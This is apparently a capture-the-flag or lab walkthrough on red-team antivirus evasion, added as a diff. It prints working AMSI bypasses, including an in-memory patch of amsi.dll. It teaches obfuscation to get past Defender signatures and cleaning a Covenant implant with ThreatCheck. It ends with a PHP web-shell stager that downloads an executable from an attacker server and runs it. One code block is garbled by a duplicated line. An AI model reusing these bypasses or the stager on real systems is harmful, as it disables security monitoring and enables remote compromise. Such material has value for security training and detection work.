+For more information about the variety of bypasses available, check out this GitHub repo, [https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)\
+
+
+We will be looking at the Matt Graeber reflection method as well as patching amsi.dll.
+
+The first bypass we will be looking at utilizes native PowerShell reflection to set the response value of AMSI to `$null`. Find the PowerShell code written by Matt Graeber below.
+
+`[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`
+
+The second method we will be looking at is patching amsi.dll written in PowerShell. This bypass is modified by BC-Security inspired by Tal Liberman, [https://github.com/BC-SECURITY/Empire/blob/master/lib/common/bypasses.py](https://github.com/BC-SECURITY/Empire/blob/master/lib/common/bypasses.py). RastaMouse also has a similar bypass written in C# that uses the same technique, [https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs](https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs).The bypass will identify DLL locations and modify memory permissions to return undetected AMSI response values.
+
+```
+$MethodDefinition = "
+
+    [DllImport(`"kernel32`")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport(`"kernel32`")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport(`"kernel32`")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+";
+
+$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
+$ABSD = 'AmsiS'+'canBuffer';
+$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
+[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
+[UInt32]$Size = 0x5;
+[UInt32]$ProtectFlag = 0x40;
+[UInt32]$OldProtectFlag = 0;
+[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
+$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 
+
+[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
+```
+
+This may seem like a lot of fancy and chopped-up code if you are unfamiliar with Windows architecture and PowerShell, but we can break it up and identify what each section of code does.\
+
+
+The first section of code lines 3 - 10 will use C# to call-in functions from Kernel32 to identify where amsi.dll has been loaded.
+
+```
+[DllImport(`"kernel32`")]
+public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); 
+
+[DllImport(`"kernel32`")]
+public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+[DllImport(`"kernel32`")]
+public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+```
+
+Once the C# functions are called in, the code will use Add-type to load the C# and identify the `AmsiScanBuffer` string in lines 13 - 16. This string can be used to determine where `amsi.dll` has been loaded and the address location using `GetProcAddress`.
+
+```
+$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
+$ABSD = 'AmsiS'+'canBuffer';
+$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
+[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
+```
+
+
+
+The next section of code lines 17 - 23 will modify memory permissions and patch `amsi.dll` to return a specified value.
+
+```
+[UInt32]$Size = 0x5;
+[UInt32]$Size = 0x5;
+[UInt32]$OldProtectFlag = 0;
+[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
+$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);
+
+[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
+```
+
+
+
+At this stage, we should have an AMSI bypass that partially works. Signatures for most AMSI bypasses have been crafted, so this means that AMSI and Defender themselves will catch these bypasses. This means we will need to obfuscate our code a slight bit to evade signatures. AMSI obfuscation will be covered in the next task.\
+
+
+For more information about AMSI bypasses, check out the following resources.\
+
+
+* [https://offensivedefence.co.uk/posts/making-amsi-jump/](https://offensivedefence.co.uk/posts/making-amsi-jump/)
+* [https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf](https://i.blackhat.com/briefings/asia/2018/asia-18-Tal-Liberman-Documenting-the-Undocumented-The-Rise-and-Fall-of-AMSI.pdf)
+* [https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
+* [https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi\_patch\_bin.nim](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi\_patch\_bin.nim)
+* [https://blog.f-secure.com/hunting-for-amsi-bypasses/](https://blog.f-secure.com/hunting-for-amsi-bypasses/)
+* [https://www.contextis.com/us/blog/amsi-bypass](https://www.contextis.com/us/blog/amsi-bypass)
+* [https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass](https://www.redteam.cafe/red-team/powershell/using-reflection-for-amsi-bypass)
+* [https://amsi.fail/](https://amsi.fail/)
+* [https://rastamouse.me/blog/asb-bypass-pt2/](https://rastamouse.me/blog/asb-bypass-pt2/)
+* [https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)
+* [https://www.youtube.com/watch?v=F\_BvtXzH4a4](https://www.youtube.com/watch?v=F\_BvtXzH4a4)
+* [https://www.youtube.com/watch?v=lP2KF7\_Kwxk](https://www.youtube.com/watch?v=lP2KF7\_Kwxk)
+* [https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
+
+### Answer the questions&#x20;
+
+**Read the above and select an AMSI bypass to obfuscate.**
+
+## AV Evasion - AMSIception
+
+Now that we have a partially working bypass, we need to obfuscate the code to bypass detections. I know, AMSIception... There are several tools and articles that can help us out in this process to understand the process and requirements better. It is helpful to think of obfuscation as an art rather than a technique. It can be experimentative and repetitive as you modify and tamper with source code and signatures.\
+
+
+To begin our obfuscation journey, we will start with manual obfuscation along with signature checking scripts. In the next task, we will cover automated obfuscators like Invoke-Obfuscation and ISE-Steroids. The manual route is far more reliable compared to automated obfuscators as you are checking and tampering with each signature within your sample, in this case, an AMSI bypass.
+
+Generally, AMSI is only looking for weak strings for AMSI bypasses such as `AmsiScanBuffer`, `amsiInitFailed`, `AmsiUtils`, etc. This is where string concatenation can come into play and aid in breaking these string signatures. As EDR solutions and products progress, these signatures and methods may become more robust. Still, these identical signatures have been prevalent for a reasonable amount of time and aren't expected to be changing any time soon for non-commercial products.\
+
+
+To aid in our obfuscation efforts, we will use the AMSITrigger script, [https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger), written by RythmStick. This script will take a given PowerShell script and each unique string within it against AMSI to identify what strings are being used to flag the script as malicious. This will only test against AMSI and not Defender; we will go over obfuscating for Defender in a later task; however, for this task, we only need to worry about AMSI since everything is file-less (mostly).\
+
+
+AMSI will also utilize regex to aggregate risk assessment; this means that no one individual string might be flagged rather an entire code block. This can be painful for us to obfuscate and require other techniques like encoding, type acceleration, and run-time decoding.\
+
+
+To use AMSITrigger, we only need to specify two parameters, `-u`, `—url` or `-i`, `—inputfile` and `-f`, `—format`. Find example syntax below.
+
+Syntax: `.\\AMSITrigger.exe -u <URL> -f 1` or `.\\AMSITrigger.exe -i <file> -f 1`
+
+![](https://i.imgur.com/tioOmMN.png)\
+
+
+Running the script against the AMSI bypass from BC-Security shown in the previous task, we see that the `VirtualProtect` code block was flagged along with the run-time buffer.\
+
+
+We can also use format 3 to see inline with the code with precisely what is being flagged.\
+
+
+<figure><img src="https://i.imgur.com/25opDVU.png" alt=""><figcaption></figcaption></figure>
+
+The first method of manual obfuscation we will look at is string concatenation. From the Microsoft documentation, "Concatenation is the process of appending one string to the end of another string. You concatenate strings by using the + operator. For string literals and string constants, concatenation occurs at compile-time; no run-time concatenation occurs. For string variables, concatenation occurs only at run time." Concatenation is a fairly common technique used within most programming languages; however, we can abuse it to aid us in obfuscation. Find an example of string concatenation below.\
+
+
+`$OBF = 'Ob' + 'fu' + 's' +'cation'`
+
+There are several various methods of string concatenation and other techniques that we can use to break signatures. Find an outline of the different methods below.\
+
+
+* Concatenate - `('co'+'ffe'+'e')`
+* Reorder - `('{1}{0}'-f'ffee','co')`
+* Whitespace - `( 'co' +'fee' + 'e')`
+
+String manipulation usually will help break single-string weak signatures; as previously explained, AMSI can also use regex to aggregate risk assessment. We will need to use more advanced techniques like encoding and type acceleration in regex signatures found below.
+
+The second method of manual obfuscation we will look at is type acceleration. From the Microsoft documentation, "Type accelerators are aliases for .NET framework classes. They allow you to access specific .NET framework classes without having to type the full class name explicitly. For example, you can shorten the `AliasAttribute` class from `[System.Management.Automation.AliasAttribute]` to `[Alias]`." [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_type\_accelerators?view=powershell-7.1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about\_type\_accelerators?view=powershell-7.1)
+
+We can abuse type accelerators to modify malicious types and break the signatures of types. For example, you can use PowerShell to create your own `PSObject` and type accelerator to be used in place of the malicious type and, in turn, break the AMSI signature.\
+
+
+This may seem like an intimidating topic at first, but we can break it down into two lines of code to make it easier to understand.\
+
+
+To create a type accelerator, we will need to first declare a `PSObject` in Assembly to retrieve the type.\
+
+
+`[PSObject].Assembly.GetType`
+
+We will then need to add our malicious type to `System.Management.Automation.TypeAccelerators`. This will allow us to use the type accelerator as a separate type from the malicious type. Find example code below.
+
+`("System.Management.Automation.TypeAccelerators")::Add('dorkstork', [system.runtime.interopservices.marshal])`
+
+We can combine these two code snippets to create a final `PSObject` containing the newly created type.\
+
+
+`[PSObject].Assembly.GetType("System.Management.Automation.TypeAccelerators")::Add('dorsktork', [system.runtime.interopservices.marshal])`
+
+We can then replace the `PSObject` at the location of the malicious type. Find a comparison of the new and old code below.\
+
+
+Old: `[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);`
+
+New: `[dorkstork]::copy($buf, 0, $BufferAddress, 6);`
+
+Now we have a newly created type accelerator that will break the signature attached to it.\
+
+
+For more information about creating type accelerators within PowerShell, check out this blog, [https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/adding-new-type-accelerators-in-powershell](https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/adding-new-type-accelerators-in-powershell)
+
+[\
+](https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/adding-new-type-accelerators-in-powershell)
+
+To entirely obfuscate our code and ensure our bypass works, we can combine the two techniques shown. In addition, you can rerun AMSITrigger as needed to help identify broken signatures and other signatures not yet broken.\
+
+
+At this point, you should now have a working AMSI bypass. You can now move on to obfuscating and modifying our grunt and launcher itself to evade AV.\
+
+
+For more information about manual obfuscation and AMSI obfuscation, check out the following resources.
+
+* [https://amsi.fail/](https://amsi.fail/)
+* [https://s3cur3th1ssh1t.github.io/Bypass\_AMSI\_by\_manual\_modification/](https://s3cur3th1ssh1t.github.io/Bypass\_AMSI\_by\_manual\_modification/)
+* [https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html](https://0x00-0x00.github.io/research/2018/10/28/How-to-bypass-AMSI-and-Execute-ANY-malicious-powershell-code.html)
+* [https://www.youtube.com/watch?v=lP2KF7\_Kwxk](https://www.youtube.com/watch?v=lP2KF7\_Kwxk)
+* [https://www.youtube.com/watch?v=F\_BvtXzH4a4](https://www.youtube.com/watch?v=F\_BvtXzH4a4)
+
+### Answer the questions&#x20;
+
+**Read the above and create a working AMSI bypass.**
+
+## AV Evasion - JU57 0BFU$C47E 1T
+
+Now that we have bypassed AMSI, we need to obfuscate and modify our launcher and grunt code to evade anti-virus. We will begin by understanding the basics of using automated obfuscators like Invoke-Obfuscation and ISE-Steroids to perform advanced string and signature manipulation.\
+
+
+We again recommend using a development virtual machine to test and edit code.\
+
+
+Invoke-Obfuscation, [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation), is a utility built by Daniel Bohannon and Cobbr. It is used to take a series of arguments/obfuscation tokens and automatically obfuscate provided code. From their GitHub, "Invoke-Obfuscation is a PowerShell v2.0+ compatible PowerShell command and script obfuscator.". Red teamers can use obfuscation to make reverse engineering/analysis harder and, in some cases, bypass anti-virus and other detections.\
+
+
+Invoke-Obfuscation syntax can seem very large and scary at first if you don't understand how it breaks down the obfuscation tokens. We can follow along with this guide created by the author of Invoke-Obfuscation to get familiar with the syntax [https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide](https://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide).\
+
+
+To begin our obfuscation attempts, we will need to set the script block or the payload we want to obfuscate and then specify tokens to use. Invoke-Obfuscation offers both an argument parsing command-line tool as well as a friendly CLI. For our purposes, we will be using the command line. We will only be covering an example of using a token to bypass anti-virus, creating a token command, and the various use cases are out of scope for this task.\
+
+
+Below is the command we will use to obfuscate our payload. The token command used at the time of writing will bypass anti-virus for some payloads or tools. We will be breaking this command down later in this task.
+
+```
+Invoke-Obfuscation -ScriptBlock {'Payload Here'} -Command 'Token\\String\\1,2,\\Whitespace\\1' -Quiet -NoExit
+```
+
+To begin breaking down the command, we will first look at the arguments passed to the tool. The `ScriptBlock` argument will parse your payload or code used to be obfuscated. The two arguments at the end of the command `-Quiet` and `-NoExit` will produce minimal verbosity and prevent exiting from the CLI when the command is run.\
+
+
+The token used can be found by itself below, along with an explanation of what the token is doing.
+
+`Token\\String\\1,2,\\Whitespace\\1`
+
+To begin understanding the syntax, we need to understand the tree structure of Invoke-Obfuscation itself. The CLI helps with this and can break down each syntax tree in the overall syntax.
+
+The first initial tree in this syntax is `Token\\String\\1,2,\\` this means it will both concatenate and reorder characters in a string. We can get this information from the CLI syntax tree found below.\
+
+
+<figure><img src="https://i.imgur.com/OVd0z8W.png" alt=""><figcaption></figcaption></figure>
+
+We can see both of the types of string obfuscation broken down, and examples are given.
+
+1. `TOKEN\\STRING\\1` - ('co'+'ffe'+'e')
+2. `TOKEN\\STRING\\2` - ('{1}{0}'-f'ffee','co')
+
+The token command will also use a second syntax tree, this time obfuscating using whitespace in `Token\\Whitespace\\1`. We can again get this information from the CLI syntax tree found below.
+
+<figure><img src="https://i.imgur.com/tY9y4gL.png" alt=""><figcaption></figcaption></figure>
+
+We can see that the obfuscation technique will randomly add whitespace to the provided strings and payload, along with an example of how it is used.
+
+1. `TOKEN\\WHITESPACE\\1` - ( 'co' +'fee' + 'e')
+
+When creating a token command, you will need to be careful not to obfuscate the payload too much and exceed the 8191 character limit in a Windows command prompt. For more information about character limitation look at the Microsoft documentation, [https://docs.microsoft.com/en-us/troubleshoot/windows-client/shell-experience/command-line-string-limitation](https://docs.microsoft.com/en-us/troubleshoot/windows-client/shell-experience/command-line-string-limitation)\
+
+
+If obfuscated efficiently, you should now have a successful PowerShell payload that will bypass anti-virus and make reverse engineering harder. Before executing on a production environment, you should always experiment and test on your development server to ensure that everything goes smoothly during the actual production engagement.\
+
+
+In the next task, we will cover what you can do when obfuscation fails, or you need to use something that isn't purely written in PowerShell by utilizing code review and ThreatCheck/DefenderCheck.\
+
+
+### Answer the questions&#x20;
+
+**Read the above and attempt to obfuscate your payload to evade AV.**
+
+## AV Evasion - 'Ca' + 'n' + 'you' + ' ' + 'see' + 'me now' + '?'
+
+Up to this point, we should have a working PoC payload and grunt. However, in many cases, the basic steps of bypassing AMSI and obfuscating code may not work. In this case, we will need to use other tools and techniques to manually identify bad bytes within the code and review the code to break signatures to get the code past AMSI and Defender cleanly.\
+
+
+As new EDR solutions and prevention methods are released, we as red teamers need to change and evolve our TTPs to work around the ever-growing blue team. Often, techniques themselves don't change, but scripts and solutions like [https://github.com/IonizeCbr/AmsiPatchDetection](https://github.com/IonizeCbr/AmsiPatchDetection) and indicators can make it harder to get our payloads and tools past even when bypassed and obfuscated, or we have other restrictions in place we need to workaround. In this case, we can use code analysis and manual code review to break signatures. A few tools can help us along the way for code analysis, including ThreatCheck, [https://github.com/rasta-mouse/ThreatCheck](https://github.com/rasta-mouse/ThreatCheck), and DefenderCheck, [https://github.com/matterpreter/DefenderCheck](https://github.com/matterpreter/DefenderCheck). Both of these tools will ingest a given file and output the found bytes attached to signatures.\
+
+
+We again recommend using a development virtual machine to test and edit code.\
+
+
+As covered in Task 7, you will need to build Threat Check using a Visual Studio solution file. It is important to note that Threat Check uses multiple NuGet packages; ensure your development machine has internet access to retrieve these packages. The build process will produce an application file, a DLL file, and an XML file. You will need all three files in the same directory for ThreatCheck to work. Files will be built to `ThreatCheck-master\\ThreatCheck\\ThreatCheck\\bin\\Debug`.
+
+<figure><img src="https://i.imgur.com/3J75SEg.png" alt=""><figcaption></figcaption></figure>
+
+ThreatCheck has a small argument list, and syntax is relatively straightforward. Find a list of arguments and a syntax example below.
+
+* `-e` or `—engine` (AMSI or Defender)
+* `-f` or `—file`
+* `-u` or `—url`
+
+Syntax: `ThreatCheck.exe -f <file>`
+
+In this task, we will be focusing on analyzing the Covenant source code; however, ThreatCheck can be used on any tools or payloads you need to clean.\
+
+
+Below you will find an example of the first bad byte that ThreatCheck will discover. ThreatCheck will aggregate bytes based on their signature strength, the lowest being the strongest signature and what you should prioritize breaking.
+
+<figure><img src="https://i.imgur.com/ta0edFX.png" alt=""><figcaption></figcaption></figure>
+
+To aid us in breaking up the Covenant signature, we will follow this guide written by RastaMouse, [https://offensivedefence.co.uk/posts/covenant-profiles-templates/](https://offensivedefence.co.uk/posts/covenant-profiles-templates/).
+
+Looking through the output of ThreatCheck, we notice a `WebProxy` along with an `http://192.168.227.139:80`. We can assume it is attached to the listener from these signatures rather than the grunt code itself. To break this signature, we can create a custom listener profile or edit the current HTTP profile.
+
+Thanks to prior research from RastaMouse, we know that you will need to add an HTTP response header to break the signature. If you were going into this blind, you would need to experiment with settings and code to identify where the engine is attaching and what you can do to break it. Add the below line to your listener profile under `Listeners > Profiles > CustomHttpProfile`.
+
+<figure><img src="https://i.imgur.com/Mln6bIX.png" alt=""><figcaption></figcaption></figure>
+
+Once added, we can build our agent again and test against ThreatCheck again.
+
+<figure><img src="https://i.imgur.com/qPW35Nb.png" alt=""><figcaption></figcaption></figure>
+
+The output above has two signatures attached. Use your knowledge of HTTP requests and responses to break the signature.\
+
+
+You will also notice a `GUID Type` signature. Use your knowledge of C# from Task 6 along with RastaMouse's guide to break this signature and create a clean grunt.
+
+You will have to repeat this process of going back and forth between ThreatCheck and the source code until you have a clean agent that evades detections.\
+
+
+If successful, you will now have a clean tool or payload that evades Defender.
+
+### Answer the questions&#x20;
+
+**Read the above and attach your clean AMSI bypass to the payload to evade detections.**
+
+**Submit the flags from S-SRV01 in Task 4.**
+
+## AV Evasion Wrapping the burrito
+
+Now that we have a working executable that can bypass anti-virus, we need a way to execute it. We know that web servers cannot execute applications, so we will need to write a PHP wrapper to download and execute our code for us.\
+
+
+We will be using a template payload/wrapper that we can use to deploy PowerShell commands on the remote server for this task. This will allow us to download and execute our malicious application. Find the source code for the template below.
+
+```
+<?php
+  function compile_stager() {
+    $init = "powershell.exe";
+    $payload = ""; // Insert PowerShell payload here
+    $execution_command = "shell_exec";
+    $query = $execution_command("$init $payload");
+    echo $query; // Execute query
+  } 
+
+  compile_stager();
+?>
+
+```
+
+The above wrapper takes advantage of the `shell_exec` command to open a process on the server and execute commands as the webserver. Of course, this will only work if you can execute privileges on the system.\
+
+
+You can decide to either upload an exe grunt or create a ps1 grunt either will work with the template.\
+
+
+To download our malicious grunt we can set up an HTTP server on our attacking machine using python, updog, etc and use `iex` or `Invoke-WebRequest` to make a remote call to our server. Find the download payload below.
+
+To download our malicious grunt, we can set up an HTTP server on our attacking machine using python, updog, etc and use `iex` or `Invoke-WebRequest` to make a remote call to our server. Find the download payload below.\
+
+
+`Invoke-WebRequest 127.0.0.1:8000/shell.exe -outfile notashell.exe`
+
+To implement this payload, you will need to change the address and port to your attacking machine. You may also want to begin by identifying the webserver's root directory to identify where you can and cannot execute the file, such as if AppLocker or other solutions are employed on the server.\
+
+
+After we have downloaded the file, we will want to execute it using PowerShell. First, find the execution payload below.\
+
+
+`.\notashell.exe` or `cmd /c .\notashell.exe`
+
+We can put together all payloads into the wrapper to complete our PHP payload. Find the final PHP code below.
+
+```
+<?php
+  function get_stager() {
+    $init = "powershell.exe";
+    $payload = "Invoke-WebRequest 127.0.0.1:8000/shell.exe -outfile notashell.exe"; // Insert PowerShell payload here
+    $execution_command = "shell_exec";
+    $query = $execution_command("$init $payload");
+    echo $query; // Execute query
+  }
+ function execute_stager() {
+  $init = "powershell.exe";
+    $payload = ".\notashell.exe"; // Insert PowerShell payload here
+    $execution_command = "shell_exec";
+    $query = $execution_command("$init $payload");
+    echo $query; // Execute query
+ }
+  get_stager();
+  execute_stager();
+  die();
+?>
+
+```
+
+We now have a working PHP shell that operates with Covenant. You can find the source code on GitHub, [https://github.com/Cryilllic/PHP-PowerShell/tree/main](https://github.com/Cryilllic/PHP-PowerShell/tree/main).\
+
+
+### Answer the questions&#x20;
+
+**Read the above and upload your PHP shell.**
+
 
 
